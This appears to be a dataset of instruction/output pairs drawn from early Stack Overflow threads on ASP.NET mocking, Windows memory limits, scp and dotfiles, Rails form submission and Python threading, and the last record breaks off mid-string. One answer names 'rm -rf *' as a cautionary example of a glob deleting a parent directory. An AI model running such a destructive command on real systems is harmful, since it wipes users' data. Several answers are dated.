{"instruction": "So the controller context depends on some asp.net internals. What are some ways to cleanly mock these up for unit tests? Seems like its very easy to clog up tests with tons of setup when I only need, for example, Request.HttpMethod to return \"GET\".\nI've seen some examples/helpers out on the nets, but some are dated. Figured this would be a good place to keep the latest and greatest.\nI'm using latest version of rhino mocks", "output": "I find that long mocking procedure to be too much friction.\nThe best way we have found - using ASP.NET MVC on a real project - is to abstract the HttpContext to an IWebContext interface that simply passes through. Then you can mock the IWebContext with no pain.\nHere is an example"}
{"instruction": "If you had to provide a wizard like form entry experience in mvc how would you abstract the page flow?", "output": "Investigate the post-redirect-get pattern.\nhttp://weblogs.asp.net/mhawley/archive/tags/MVC/default.aspx\nhttp://devlicio.us/blogs/tim_barcz/archive/2008/08/22/prg-pattern-in-the-asp-net-mvc-framework.aspx\nUse that along with a robust domain model (for tracking steps or form completion state or whatever you call it) and you're golden."}
{"instruction": "Obviously, that's 64-bit windows.\nAlso, what's the maximum amount of memory a single 64-bit process can use?\nI was kind of counting on using it all... \n(Yes, I know what I'm doing, please don't tell me that if I need that much RAM i must be doing something wrong)\nAlso, is this the same for a .Net 2.0 process? Or is there a lower limit for .Net?", "output": "Something we found out recently: with MySQL running on Win32, you can only use up to 2GB per process. On Win64, the memory is not managed as well and a single MySQL instance will run your memory into the ground. Ours used up all 16GB we have. So regarding how much memory 1 64-bit process can use: the answer is however much the OS allows."}
{"instruction": "Obviously, that's 64-bit windows.\nAlso, what's the maximum amount of memory a single 64-bit process can use?\nI was kind of counting on using it all... \n(Yes, I know what I'm doing, please don't tell me that if I need that much RAM i must be doing something wrong)\nAlso, is this the same for a .Net 2.0 process? Or is there a lower limit for .Net?", "output": "What version of windows? it differs from XP to vista and from home to business versions of vista, and I would guess again for server.\nsee here for more info on maximum ram for diffrent windows versions\nfor Windows Server 2008 Datacenter MS quote 2 TB of physical memory."}
{"instruction": "Obviously, that's 64-bit windows.\nAlso, what's the maximum amount of memory a single 64-bit process can use?\nI was kind of counting on using it all... \n(Yes, I know what I'm doing, please don't tell me that if I need that much RAM i must be doing something wrong)\nAlso, is this the same for a .Net 2.0 process? Or is there a lower limit for .Net?", "output": "According to wikipedia you can have 128 GB of physical RAM in a 64-bit Windows XP computer."}
{"instruction": "Obviously, that's 64-bit windows.\nAlso, what's the maximum amount of memory a single 64-bit process can use?\nI was kind of counting on using it all... \n(Yes, I know what I'm doing, please don't tell me that if I need that much RAM i must be doing something wrong)\nAlso, is this the same for a .Net 2.0 process? Or is there a lower limit for .Net?", "output": "We run Windows boxes with 16 gigs of memory, but that is because we are running multiple VM Ware instances, I presume you mean in a single instance. On Vista it depends upon the edition. It breaks out like this:\n\n\nVista Basic: 8 GB\nVista Home Premium: 16 GB\nVista Business/Enterprise/Ultimate: 128+ GB"}
{"instruction": "Obviously, that's 64-bit windows.\nAlso, what's the maximum amount of memory a single 64-bit process can use?\nI was kind of counting on using it all... \n(Yes, I know what I'm doing, please don't tell me that if I need that much RAM i must be doing something wrong)\nAlso, is this the same for a .Net 2.0 process? Or is there a lower limit for .Net?", "output": "This is a Windows Server machine.\nAs for which edition (Datacenter, Enterprise, etc)... Whatever it takes to give my little .Net Process as much memory as it can."}
{"instruction": "Obviously, that's 64-bit windows.\nAlso, what's the maximum amount of memory a single 64-bit process can use?\nI was kind of counting on using it all... \n(Yes, I know what I'm doing, please don't tell me that if I need that much RAM i must be doing something wrong)\nAlso, is this the same for a .Net 2.0 process? Or is there a lower limit for .Net?", "output": "From http://technet.microsoft.com/en-us/library/cc758523.aspx\n  - Windows Server 2003, 64 bit Datacenter Edition supports physical memory up to 512GB\nA single process should be able to use most of it, some will be used by the OS.\nThe answer from Re0sless is better then mine. The limit is now 2TB, in Datacenter SP2, and 2008."}
{"instruction": "What is the best open-source equivalent for Mathematica?  My requirements are:\n\n(most important) Must be a real computer algebra system (CAS).  Notably, I don't want Matlab clones -- I want something that can, at least, symbolically differentiate and integrate.\nMust be programmable.  A functional-programming view of the world, like Mathematica's, would be awesome.  The basic datatype of M'ica is the list, which is very convenient!\n(least important) Similar syntax would be nice.\n\nThe ability to deal with objects such as groups or graphs would be a great bonus, but my primary emphasis is on the main things Mathematica and Maple do: algebra and calculus, both symbolic and numeric.  Also, plotting is not high on my list of requirements, as I'm mostly a terminal and not GUI user.", "output": "There's also a C++ library CAS called GiNaC.  This isn't exactly what you were looking for but it's certainly very programmable."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "@aku\n\nthen you should throw System.ArgumentNullException\n\nI don't see how throwing a .net framework exception is going to help him :)\nOtherwise, in a Java way, assuming the null comes from a programming error (ie. should never go outside the testing phase), then leave the system throw it, or if there are side-effects reaching that point, check for null at the beginning and throw either IllegalArgumentException or NullPointerException.\nIf the null could come from an actual exceptional case but you don't want to use a checked exception for that, then you definitely want to go the IllegalArgumentException route at the beginning of the method."}
{"instruction": "I don't like the AutoSize property of the Label control. I have a custom Label that draws a fancy rounded border among other things. I'm placing a AutoSize = false in my constructor, however, when I place it in design mode, the property always is True. \nI have overridden other properties with success but this one is happily ignoring me. Does anybody has a clue if this is \"by MS design\"?\nHere's the full source code of my Label in case anyone is interested.\nusing System;\nusing System.ComponentModel;\nusing System.Drawing;\nusing System.Drawing.Drawing2D;\nusing System.Windows.Forms;\n\nnamespace Dentactil.UI.WinControls\n{\n    [DefaultProperty(\"TextString\")]\n    [DefaultEvent(\"TextClick\")]\n    public partial class RoundedLabel : UserControl\n    {\n        private static readonly Color DEFAULT_BORDER_COLOR = Color.FromArgb( 132, 100, 161 );\n        private const float DEFAULT_BORDER_WIDTH = 2.0F;\n        private const int DEFAULT_ROUNDED_WIDTH = 16;\n        private const int DEFAULT_ROUNDED_HEIGHT = 12;\n\n        private Color mBorderColor = DEFAULT_BORDER_COLOR;\n        private float mBorderWidth = DEFAULT_BORDER_WIDTH;\n        private int mRoundedWidth = DEFAULT_ROUNDED_WIDTH;\n        private int mRoundedHeight = DEFAULT_ROUNDED_HEIGHT;\n\n        public event EventHandler TextClick;\n\n        private Padding mPadding = new Padding(8);\n\n        public RoundedLabel()\n        {\n            InitializeComponent();\n        }\n\n        public Cursor TextCursor\n        {\n            get { return lblText.Cursor; }\n            set { lblText.Cursor = value; }\n        }\n\n        public Padding TextPadding\n        {\n            get { return mPadding; }\n            set\n            {\n                mPadding = value;\n                UpdateInternalBounds();\n            }\n        }\n\n        public ContentAlignment TextAlign\n        {\n            get { return lblText.TextAlign; }\n            set { lblText.TextAlign = value; }\n        }\n\n        public string TextString\n        {\n            get { return lblText.Text; }\n            set { lblText.Text = value; }\n        }\n\n        public override Font Font\n        {\n            get { return base.Font; }\n            set\n            {\n                base.Font = value;\n                lblText.Font = value;\n            }\n        }\n\n        public override Color ForeColor\n        {\n            get { return base.ForeColor; }\n            set\n            {\n                base.ForeColor = value;\n                lblText.ForeColor = value;\n            }\n        }\n\n        public Color BorderColor\n        {\n            get { return mBorderColor; }\n            set\n            {\n                mBorderColor = value;\n                Invalidate();\n            }\n        }\n\n        [DefaultValue(DEFAULT_BORDER_WIDTH)]\n        public float BorderWidth\n        {\n            get { return mBorderWidth; }\n            set\n            {\n                mBorderWidth = value;\n                Invalidate();\n            }\n        }\n\n        [DefaultValue(DEFAULT_ROUNDED_WIDTH)]\n        public int RoundedWidth\n        {\n            get { return mRoundedWidth; }\n            set\n            {\n                mRoundedWidth = value;\n                Invalidate();\n            }\n        }\n\n        [DefaultValue(DEFAULT_ROUNDED_HEIGHT)]\n        public int RoundedHeight\n        {\n            get { return mRoundedHeight; }\n            set\n            {\n                mRoundedHeight = value;\n                Invalidate();\n            }\n        }\n\n        private void UpdateInternalBounds()\n        {\n            lblText.Left = mPadding.Left;\n            lblText.Top = mPadding.Top;\n\n            int width = Width - mPadding.Right - mPadding.Left;\n            lblText.Width = width > 0 ? width : 0;\n\n            int heigth = Height - mPadding.Bottom - mPadding.Top;\n            lblText.Height = heigth > 0 ? heigth : 0;\n        }\n\n        protected override void OnLoad(EventArgs e)\n        {\n            UpdateInternalBounds();\n            base.OnLoad(e);\n        }\n\n        protected override void OnPaint(PaintEventArgs e)\n        {\n            SmoothingMode smoothingMode = e.Graphics.SmoothingMode;\n            e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;\n\n            int roundedWidth = RoundedWidth > (Width - 1)/2 ? (Width - 1)/2 : RoundedWidth;\n            int roundedHeight = RoundedHeight > (Height - 1)/2 ? (Height - 1)/2 : RoundedHeight;\n\n            GraphicsPath path = new GraphicsPath();\n            path.AddLine(0, roundedHeight, 0, Height - 1 - roundedHeight);\n            path.AddArc(new RectangleF(0, Height - 1 - 2*roundedHeight, 2*roundedWidth, 2*roundedHeight), 180, -90);\n            path.AddLine(roundedWidth, Height - 1, Width - 1 - 2*roundedWidth, Height - 1);\n            path.AddArc(new RectangleF(Width - 1 - 2*roundedWidth, Height - 1 - 2*roundedHeight, 2*roundedWidth, 2*roundedHeight), 90, -90);\n            path.AddLine(Width - 1, Height - 1 - roundedHeight, Width - 1, roundedHeight);\n            path.AddArc(new RectangleF(Width - 1 - 2*roundedWidth, 0, 2*roundedWidth, 2*roundedHeight), 0, -90);\n            path.AddLine(Width - 1 - roundedWidth, 0, roundedWidth, 0);\n            path.AddArc(new RectangleF(0, 0, 2*roundedWidth, 2*roundedHeight), -90, -90);\n\n            e.Graphics.DrawPath(new Pen(new SolidBrush(BorderColor), BorderWidth), path);\n\n            e.Graphics.SmoothingMode = smoothingMode;\n            base.OnPaint(e);\n        }\n\n        protected override void OnResize(EventArgs e)\n        {\n            UpdateInternalBounds();\n            base.OnResize(e);\n        }\n\n        private void lblText_Click(object sender, EventArgs e)\n        {\n            if (TextClick != null)\n            {\n                TextClick(this, e);\n            }\n        }\n    }\n}\n\n(there are some issues with Stack Overflow's markup and the Underscore, but it's easy to follow the code).\n\nI have actually removed that override some time ago when I saw that it wasn't working. I'll add it again now and test. Basically I want to replace the Label with some new label called: IWillNotAutoSizeLabel ;)\nI basically hate the autosize property \"on by default\".", "output": "I've seen similar behaviour when setting certain properties of controls in the constructor of the form itself. They seem to revert back to their design-time defaults.\nI notice you're already overriding the OnLoad method. Have you tried setting AutoSize = false there? Or are you mainly concerned with providing a default value of false?"}
{"instruction": "How would I change the initial templates created by Xcode when creating a new Cocoa Class.\nI am referring to the comments and class name created when using Xcode's new class wizard.", "output": "You wouldn't change the existing templates.  In other words, don't modify anything under the /Developer hierarchy (or wherever you installed your developer tools).\nInstead, clone the templates you want to have customized variants of.  Then change their names and the information in them.  Finally, put them in the appropriate location in your account's Library/Application Support folder, specifically:\n\nFile templates: ~/Library/Application Support/Developer/Shared/Xcode/File Templates/\nTarget templates: ~/Library/Application Support/Developer/Shared/Xcode/Target Templates/\nProject templates: ~/Library/Application Support/Developer/Shared/Xcode/Project Templates/\n\nThat way they won't be overwritten when you install new developer tools, and you can tweak them to your heart's content."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "I know I find OOP useful pretty much solely on a syntactical sugar basis (encapsulation, operator overloading, typechecking). As to the benefits of OOP... I don't know. I don't think it's worse than procedural stuff. \nOn the lighter side, my OOP lecturer said that OOP is important because otherwise the \"code would have too many loops\". Yeah. Sometimes it's depressing that I pay $500 per paper. :("}
{"instruction": "What is the best open-source equivalent for Mathematica?  My requirements are:\n\n(most important) Must be a real computer algebra system (CAS).  Notably, I don't want Matlab clones -- I want something that can, at least, symbolically differentiate and integrate.\nMust be programmable.  A functional-programming view of the world, like Mathematica's, would be awesome.  The basic datatype of M'ica is the list, which is very convenient!\n(least important) Similar syntax would be nice.\n\nThe ability to deal with objects such as groups or graphs would be a great bonus, but my primary emphasis is on the main things Mathematica and Maple do: algebra and calculus, both symbolic and numeric.  Also, plotting is not high on my list of requirements, as I'm mostly a terminal and not GUI user.", "output": "The SAS guys at work have mentioned R."}
{"instruction": "How would I change the initial templates created by Xcode when creating a new Cocoa Class.\nI am referring to the comments and class name created when using Xcode's new class wizard.", "output": "Xcode uses template files for file and project templates and does variable expansion in both at creation time.\nXcode 3.0 templates can be found in [Dev Installation]/Library/Xcode/, likely /Developer/Library/Xcode. If you want to modify these templates or add your own, use the following directories to save your new/modified templates so that they are not wiped out by future Developer Tool upgrades:\n\nFile templates:\n~/Library/Developer/Shared/Xcode/File\nTemplates/ \nTarget templates:\n~/Library/Developer/Shared/Xcode/Target\nTemplates/ \nProject templates:\n~/Library/Developer/Shared/Xcode/Project\nTemplates/\n\nI think that you can also use the /Library/Developer/Shared/Xcode/[File|Target|Project] Templates/ directory for templates shared by all users.\nIf you just want to change the MyCompanyName in the templates, the following command line will do the trick:\ndefaults write com.apple.Xcode PBXCustomTemplateMacroDefinitions '{ \"ORGANIZATIONNAME\" = \"NewCompanyName\";}'\n\nA  good tutorial on writing file templates is here [MacResearch.org]."}
{"instruction": "I am currently using the following command to upload my site content:\nscp -r web/* user@site.com:site.com/\n\nThis works great except that the .htaccess file is not sent. Presumably, this is because it's hidden.\nI have tried adding a second line to send the file explicitely:\nscp -r web/.htaccess user@site.com:site.com/.htaccess\n\nThis works great except now I have to enter my password twice.\nAny thoughts on how to make this deploy with only 1 or 0 entries of my password?", "output": "Just combine the two commands:\nscp -r web/* web/.htaccess user@site.com:site.com/\n\nIf you want 0 entries of your password you can set up public key authentication for ssh/scp."}
{"instruction": "So the controller context depends on some asp.net internals. What are some ways to cleanly mock these up for unit tests? Seems like its very easy to clog up tests with tons of setup when I only need, for example, Request.HttpMethod to return \"GET\".\nI've seen some examples/helpers out on the nets, but some are dated. Figured this would be a good place to keep the latest and greatest.\nI'm using latest version of rhino mocks", "output": "Here's a snippet from Jason's link. Its the same as Phil's method but uses rhino. \nNote: mockHttpContext.Request is stubbed to return mockRequest before mockRequest's internals are stubbed out. I believe this order is required.\n// create a fake web context\nvar mockHttpContext = MockRepository.GenerateMock<HttpContextBase>();\nvar mockRequest = MockRepository.GenerateMock<HttpRequestBase>();\nmockHttpContext.Stub(x => x.Request).Return(mockRequest);\n\n// tell the mock to return \"GET\" when HttpMethod is called\nmockRequest.Stub(x => x.HttpMethod).Return(\"GET\");            \n\nvar controller = new AccountController();\n\n// assign the fake context\nvar context = new ControllerContext(mockHttpContext, \n                  new RouteData(), \n                  controller);\ncontroller.ControllerContext = context;\n\n// act\n..."}
{"instruction": "I am currently using the following command to upload my site content:\nscp -r web/* user@site.com:site.com/\n\nThis works great except that the .htaccess file is not sent. Presumably, this is because it's hidden.\nI have tried adding a second line to send the file explicitely:\nscp -r web/.htaccess user@site.com:site.com/.htaccess\n\nThis works great except now I have to enter my password twice.\nAny thoughts on how to make this deploy with only 1 or 0 entries of my password?", "output": "A word of caution - don't attempt to match dotted files (like .htaccess) with .* - this inconveniently also matches .., and would result in copying all the files on the path to the root directory. I did this once (with rm, no less!) and I had to rebuild the server because I'd messed with /var.\n@jwmittag:\nI just did a test on Ubuntu and .* matches when I use cp. Here's an example:\nroot@krash:/# mkdir a\nroot@krash:/# mkdir b\nroot@krash:/# mkdir a/c\nroot@krash:/# touch a/d\nroot@krash:/# touch a/c/e\nroot@krash:/# cp -r a/c/.* b\ncp: will not create hard link `b/c' to directory `b/.'\nroot@krash:/# ls b\nd  e\n\nIf .* did not match .., then d shouldn't be in b."}
{"instruction": "I am currently using the following command to upload my site content:\nscp -r web/* user@site.com:site.com/\n\nThis works great except that the .htaccess file is not sent. Presumably, this is because it's hidden.\nI have tried adding a second line to send the file explicitely:\nscp -r web/.htaccess user@site.com:site.com/.htaccess\n\nThis works great except now I have to enter my password twice.\nAny thoughts on how to make this deploy with only 1 or 0 entries of my password?", "output": "Some background info: the * wildcard does not match so-called \"dot-files\" (i.e. files whose name begins with a dot).\nSome shells allow you to set an option, so that it will match dot-files, however, doing that is asking for a lot of pain: now * will also match . (the current directory) and .. (the parent directory), which is usually not what is intended and can be quite surprising! (rm -rf * deleting the parent directory is probably not the best way to start a day ...)"}
{"instruction": "In Ruby on Rails, I'm attempting to update the innerHTML of a div tag using the form_remote_tag helper.  This update happens whenever an associated select tag receives an onchange event.  The problem is, <select onchange=\"this.form.submit();\">; doesn't work.  Nor does document.forms[0].submit().  The only way to get the onsubmit code generated in the form_remote_tag to execute is to create a hidden submit button, and invoke the click method on the button from the select tag.  Here's a working ERb partial example.\n<% form_remote_tag :url => product_path, :update => 'content', :method => 'get' do -%>\n  <% content_tag :div, :id => 'content' do -%>\n    <%= select_tag :update, options_for_select([[\"foo\", 1], [\"bar\", 2]]), :onchange => \"this.form.commit.click\" %>\n    <%= submit_tag 'submit_button', :style => \"display: none\" %>\n  <% end %>\n<% end %>\n\nWhat I want to do is something like this, but it doesn't work.\n<% form_remote_tag :url => product_path, :update => 'content', :method => 'get' do -%>\n  <% content_tag :div, :id => 'content' do -%>\n    # the following line does not work\n    <%= select_tag :update, options_for_select([[\"foo\", 1], [\"bar\", 2]]), :onchange => \"this.form.onsubmit()\" %>\n  <% end %>\n<% end %>\n\nSo, is there any way to remove the invisible submit button for this use case?\nThere seems to be some confusion.  So, let me explain.  The basic problem is that submit() doesn't call the onsubmit() code rendered into the form.\nThe actual HTML form that Rails renders from this ERb looks like this:\n<form action=\"/products/1\" method=\"post\" onsubmit=\"new Ajax.Updater('content', '/products/1', {asynchronous:true, evalScripts:true, method:'get', parameters:Form.serialize(this)}); return false;\">\n  <div style=\"margin:0;padding:0\">\n    <input name=\"authenticity_token\" type=\"hidden\" value=\"4eacf78eb87e9262a0b631a8a6e417e9a5957cab\" />\n  </div>\n  <div id=\"content\">\n    <select id=\"update\" name=\"update\" onchange=\"this.form.commit.click\">\n      <option value=\"1\">foo</option>\n      <option value=\"2\">bar</option>\n    </select>\n    <input name=\"commit\" style=\"display: none\" type=\"submit\" value=\"submit_button\" />\n  </div>\n</form>\n\nI want to axe the invisible submit button, but using a straight form.submit appears to not work.  So, I need some way to call the form's onsubmit event code.\nUpdate: Orion Edwards solution would work if there wasn't a return(false); generated by Rails.  I'm not sure which is worse though, sending a phantom click to an invisible submit button or calling eval on the getAttribute('onsubmit') call after removing the return call with a javascript string replacement!", "output": "give your form an id.\nthen\ndocument.getElementById('formid').submit();\n\nIf you are loading Javascript into a div via innerHTML, it won't run...just FYI."}
{"instruction": "In Ruby on Rails, I'm attempting to update the innerHTML of a div tag using the form_remote_tag helper.  This update happens whenever an associated select tag receives an onchange event.  The problem is, <select onchange=\"this.form.submit();\">; doesn't work.  Nor does document.forms[0].submit().  The only way to get the onsubmit code generated in the form_remote_tag to execute is to create a hidden submit button, and invoke the click method on the button from the select tag.  Here's a working ERb partial example.\n<% form_remote_tag :url => product_path, :update => 'content', :method => 'get' do -%>\n  <% content_tag :div, :id => 'content' do -%>\n    <%= select_tag :update, options_for_select([[\"foo\", 1], [\"bar\", 2]]), :onchange => \"this.form.commit.click\" %>\n    <%= submit_tag 'submit_button', :style => \"display: none\" %>\n  <% end %>\n<% end %>\n\nWhat I want to do is something like this, but it doesn't work.\n<% form_remote_tag :url => product_path, :update => 'content', :method => 'get' do -%>\n  <% content_tag :div, :id => 'content' do -%>\n    # the following line does not work\n    <%= select_tag :update, options_for_select([[\"foo\", 1], [\"bar\", 2]]), :onchange => \"this.form.onsubmit()\" %>\n  <% end %>\n<% end %>\n\nSo, is there any way to remove the invisible submit button for this use case?\nThere seems to be some confusion.  So, let me explain.  The basic problem is that submit() doesn't call the onsubmit() code rendered into the form.\nThe actual HTML form that Rails renders from this ERb looks like this:\n<form action=\"/products/1\" method=\"post\" onsubmit=\"new Ajax.Updater('content', '/products/1', {asynchronous:true, evalScripts:true, method:'get', parameters:Form.serialize(this)}); return false;\">\n  <div style=\"margin:0;padding:0\">\n    <input name=\"authenticity_token\" type=\"hidden\" value=\"4eacf78eb87e9262a0b631a8a6e417e9a5957cab\" />\n  </div>\n  <div id=\"content\">\n    <select id=\"update\" name=\"update\" onchange=\"this.form.commit.click\">\n      <option value=\"1\">foo</option>\n      <option value=\"2\">bar</option>\n    </select>\n    <input name=\"commit\" style=\"display: none\" type=\"submit\" value=\"submit_button\" />\n  </div>\n</form>\n\nI want to axe the invisible submit button, but using a straight form.submit appears to not work.  So, I need some way to call the form's onsubmit event code.\nUpdate: Orion Edwards solution would work if there wasn't a return(false); generated by Rails.  I'm not sure which is worse though, sending a phantom click to an invisible submit button or calling eval on the getAttribute('onsubmit') call after removing the return call with a javascript string replacement!", "output": "If you didn't actually want to submit the form, but just invoke whatever code happened to be in the onsubmit, you could possibly do this: (untested)\nvar code = document.getElementById('formId').getAttribute('onsubmit');\neval(code);"}
{"instruction": "I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.\nNow, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.\nIn short: I am actually quite happy with MSBuild (especially since it's the \"official\" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.\nWhat would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)", "output": "CC.NET is simply the build server technology, not the build script technology. We use CC.NET at work to very successfully call MSBuild build scripts with no problems.\nNAnt is an older and more mature build scripting language, but they are both similar in how they work. There are very few things I could do in NAnt that I can't also do in MSBuild, so it really comes down to which one you are more comfortable with. As far as how active NAnt is, don't go by when the last release was...instead go by when the last nightly build was. NAnt tends to go a long time between releases, but the nightly builds are usually pretty stable."}
{"instruction": "I would like to retrieve the ethernet address of the network interface that is used to access a particular website.\nHow can this be done in Java?\nSolution Note that the accepted solution of getHardwareAddress is only available in Java 6. There does not seem to be a solution for Java 5 aside from executing i(f|p)confing.", "output": "You can get the address that connects to your ServerSocket using http://java.sun.com/javase/6/docs/api/java/net/NetworkInterface.html#getInetAddresses()\nHowever if your client is connecting via a NAT, then you will get the address of the router and NOT the Ethernet address. If it is on your local network (via a hub/switch, no router with NAT) the it wil work as intended."}
{"instruction": "I would like to retrieve the ethernet address of the network interface that is used to access a particular website.\nHow can this be done in Java?\nSolution Note that the accepted solution of getHardwareAddress is only available in Java 6. There does not seem to be a solution for Java 5 aside from executing i(f|p)confing.", "output": "java.net.NetworkInterface.getHardwareAddress (method added in Java 6)\nIt has to be called on the machine you are interested in - the MAC is not transferred across network boundaries (i.e. LAN and WAN). If you want to make use of it on a website server to interrogate the clients, you'd have to run an applet that would report the result back to you.\nFor Java 5 and older I found code parsing output of command line tools on various systems."}
{"instruction": "In Ruby on Rails, I'm attempting to update the innerHTML of a div tag using the form_remote_tag helper.  This update happens whenever an associated select tag receives an onchange event.  The problem is, <select onchange=\"this.form.submit();\">; doesn't work.  Nor does document.forms[0].submit().  The only way to get the onsubmit code generated in the form_remote_tag to execute is to create a hidden submit button, and invoke the click method on the button from the select tag.  Here's a working ERb partial example.\n<% form_remote_tag :url => product_path, :update => 'content', :method => 'get' do -%>\n  <% content_tag :div, :id => 'content' do -%>\n    <%= select_tag :update, options_for_select([[\"foo\", 1], [\"bar\", 2]]), :onchange => \"this.form.commit.click\" %>\n    <%= submit_tag 'submit_button', :style => \"display: none\" %>\n  <% end %>\n<% end %>\n\nWhat I want to do is something like this, but it doesn't work.\n<% form_remote_tag :url => product_path, :update => 'content', :method => 'get' do -%>\n  <% content_tag :div, :id => 'content' do -%>\n    # the following line does not work\n    <%= select_tag :update, options_for_select([[\"foo\", 1], [\"bar\", 2]]), :onchange => \"this.form.onsubmit()\" %>\n  <% end %>\n<% end %>\n\nSo, is there any way to remove the invisible submit button for this use case?\nThere seems to be some confusion.  So, let me explain.  The basic problem is that submit() doesn't call the onsubmit() code rendered into the form.\nThe actual HTML form that Rails renders from this ERb looks like this:\n<form action=\"/products/1\" method=\"post\" onsubmit=\"new Ajax.Updater('content', '/products/1', {asynchronous:true, evalScripts:true, method:'get', parameters:Form.serialize(this)}); return false;\">\n  <div style=\"margin:0;padding:0\">\n    <input name=\"authenticity_token\" type=\"hidden\" value=\"4eacf78eb87e9262a0b631a8a6e417e9a5957cab\" />\n  </div>\n  <div id=\"content\">\n    <select id=\"update\" name=\"update\" onchange=\"this.form.commit.click\">\n      <option value=\"1\">foo</option>\n      <option value=\"2\">bar</option>\n    </select>\n    <input name=\"commit\" style=\"display: none\" type=\"submit\" value=\"submit_button\" />\n  </div>\n</form>\n\nI want to axe the invisible submit button, but using a straight form.submit appears to not work.  So, I need some way to call the form's onsubmit event code.\nUpdate: Orion Edwards solution would work if there wasn't a return(false); generated by Rails.  I'm not sure which is worse though, sending a phantom click to an invisible submit button or calling eval on the getAttribute('onsubmit') call after removing the return call with a javascript string replacement!", "output": "If you have to use Rail's built-in Javascript generation, I would use Orion's solution, but with one small alteration to compensate for the return code.\neval ('(function(){' + code + '})()');\n\nHowever, in my opinion you'd have an easier time in the long run by separating out the Javascript code into an external file or separate callable functions."}
{"instruction": "A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether.  What can said about this rumor?", "output": "I've used it in several applications and have never had nor heard of threading being anything other than 100% reliable, as long as you know its limits.  You can't spawn 1000 threads at the same time and expect your program to run properly on Windows, however you can easily write a worker pool and just feed it 1000 operations, and keep everything nice and under control."}
{"instruction": "A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether.  What can said about this rumor?", "output": "As far as I know there are no real bugs, but the performance when threading in cPython is really bad (compared to most other threading implementations, but usually good enough if all most of the threads do is block) due to the GIL (Global Interpreter Lock), so really it is implementation specific rather than language specific. Jython, for example, does not suffer from this due to using the Java thread model.\nSee this post on why it is not really feasible to remove the GIL from the cPython implementation, and this for some practical elaboration and workarounds.\nDo a quick google for \"Python GIL\" for more information."}
{"instruction": "In Ruby on Rails, I'm attempting to update the innerHTML of a div tag using the form_remote_tag helper.  This update happens whenever an associated select tag receives an onchange event.  The problem is, <select onchange=\"this.form.submit();\">; doesn't work.  Nor does document.forms[0].submit().  The only way to get the onsubmit code generated in the form_remote_tag to execute is to create a hidden submit button, and invoke the click method on the button from the select tag.  Here's a working ERb partial example.\n<% form_remote_tag :url => product_path, :update => 'content', :method => 'get' do -%>\n  <% content_tag :div, :id => 'content' do -%>\n    <%= select_tag :update, options_for_select([[\"foo\", 1], [\"bar\", 2]]), :onchange => \"this.form.commit.click\" %>\n    <%= submit_tag 'submit_button', :style => \"display: none\" %>\n  <% end %>\n<% end %>\n\nWhat I want to do is something like this, but it doesn't work.\n<% form_remote_tag :url => product_path, :update => 'content', :method => 'get' do -%>\n  <% content_tag :div, :id => 'content' do -%>\n    # the following line does not work\n    <%= select_tag :update, options_for_select([[\"foo\", 1], [\"bar\", 2]]), :onchange => \"this.form.onsubmit()\" %>\n  <% end %>\n<% end %>\n\nSo, is there any way to remove the invisible submit button for this use case?\nThere seems to be some confusion.  So, let me explain.  The basic problem is that submit() doesn't call the onsubmit() code rendered into the form.\nThe actual HTML form that Rails renders from this ERb looks like this:\n<form action=\"/products/1\" method=\"post\" onsubmit=\"new Ajax.Updater('content', '/products/1', {asynchronous:true, evalScripts:true, method:'get', parameters:Form.serialize(this)}); return false;\">\n  <div style=\"margin:0;padding:0\">\n    <input name=\"authenticity_token\" type=\"hidden\" value=\"4eacf78eb87e9262a0b631a8a6e417e9a5957cab\" />\n  </div>\n  <div id=\"content\">\n    <select id=\"update\" name=\"update\" onchange=\"this.form.commit.click\">\n      <option value=\"1\">foo</option>\n      <option value=\"2\">bar</option>\n    </select>\n    <input name=\"commit\" style=\"display: none\" type=\"submit\" value=\"submit_button\" />\n  </div>\n</form>\n\nI want to axe the invisible submit button, but using a straight form.submit appears to not work.  So, I need some way to call the form's onsubmit event code.\nUpdate: Orion Edwards solution would work if there wasn't a return(false); generated by Rails.  I'm not sure which is worse though, sending a phantom click to an invisible submit button or calling eval on the getAttribute('onsubmit') call after removing the return call with a javascript 